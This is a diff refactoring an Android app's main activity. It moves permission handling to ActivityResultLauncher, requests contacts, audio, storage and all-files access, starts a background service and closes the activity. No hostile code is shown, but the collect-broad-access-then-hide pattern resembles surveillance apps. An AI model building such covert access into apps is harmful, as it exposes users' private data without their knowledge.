@@ -9,24 +9,39 @@ import android.os.Bundle;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.Toast;
+import androidx.activity.result.ActivityResultLauncher;
+import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
-    private static final int PERMISSION_CODE = 100;
-    private static final int MANAGE_STORAGE_CODE = 101;
+    private ActivityResultLauncher<Intent> manageStorageLauncher;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        manageStorageLauncher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    if (android.os.Environment.isExternalStorageManager()) {
+                        startService();
+                    } else {
+                        Toast.makeText(this, "صلاحية إدارة التخزين مطلوبة", Toast.LENGTH_LONG).show();
+                    }
+                }
+            }
+        );
+
         Button btn = findViewById(R.id.btnGrant);
-        btn.setOnClickListener(v -> requestPermissions());
+        btn.setOnClickListener(v -> requestAllPermissions());
     }
 
-    private void requestPermissions() {
-        String[] perms = {
+    private void requestAllPermissions() {
+        String[] permissions = {
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
             Manifest.permission.READ_CONTACTS,
@@ -38,7 +53,7 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.RECORD_AUDIO
         };
         boolean allGranted = true;
-        for (String p : perms) {
+        for (String p : permissions) {
             if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                 allGranted = false;
                 break;
@@ -47,21 +62,37 @@ public class MainActivity extends AppCompatActivity {
         if (allGranted) {
             checkManageStorage();
         } else {
-            ActivityCompat.requestPermissions(this, perms, PERMISSION_CODE);
+            ActivityCompat.requestPermissions(this, permissions, 100);
         }
     }
 
     private void checkManageStorage() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
+            if (!android.os.Environment.isExternalStorageManager()) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                 intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, MANAGE_STORAGE_CODE);
+                manageStorageLauncher.launch(intent);
             } else {
                 startService();
             }
         } else {
             startService();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == 100) {
+            boolean granted = true;
+            for (int r : grantResults) {
+                if (r != PackageManager.PERMISSION_GRANTED) {
+                    granted = false;
+                    break;
+                }
+            }
+            if (granted) checkManageStorage();
+            else Toast.makeText(this, "بعض الصلاحيات مرفوضة", Toast.LENGTH_LONG).show();
         }
     }
 
@@ -74,28 +105,5 @@ public class MainActivity extends AppCompatActivity {
         }
         Toast.makeText(this, "تم تشغيل الخدمة", Toast.LENGTH_SHORT).show();
         finish();
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == PERMISSION_CODE) {
-            boolean granted = true;
-            for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
-            if (granted) checkManageStorage();
-            else Toast.makeText(this, "بعض الصلاحيات مرفوضة", Toast.LENGTH_LONG).show();
-        }
-    }
-
-    @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-        super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == MANAGE_STORAGE_CODE) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
-                startService();
-            } else {
-                Toast.makeText(this, "صلاحية التخزين مطلوبة", Toast.LENGTH_LONG).show();
-            }
-        }
     }
 }
